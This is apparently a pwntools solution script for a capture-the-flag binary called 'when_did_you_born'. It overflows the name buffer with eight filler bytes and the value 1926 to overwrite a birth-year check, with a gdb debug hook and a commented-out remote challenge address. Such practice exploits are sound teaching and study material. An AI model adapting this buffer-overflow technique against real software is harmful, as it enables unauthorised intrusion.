#coding = utf-8
from pwn import *

#p = remote ('220.249.52.133',39683)
context(arch='amd64',os='linux',log_level='debug')
elf = ELF('./when_did_you_born')
p=process('./when_did_you_born')

born_time = 1926
payload = 'a'*8+p64(born_time)

def debug(addr1 = '0x400826'):
    raw_input('debug')
    gdb.attach(p, "b * " + addr1)
debug()

p.sendlineafter("What's Your Birth?","2020")
p.sendlineafter("What's Your Name?",payload)
p.interactive()
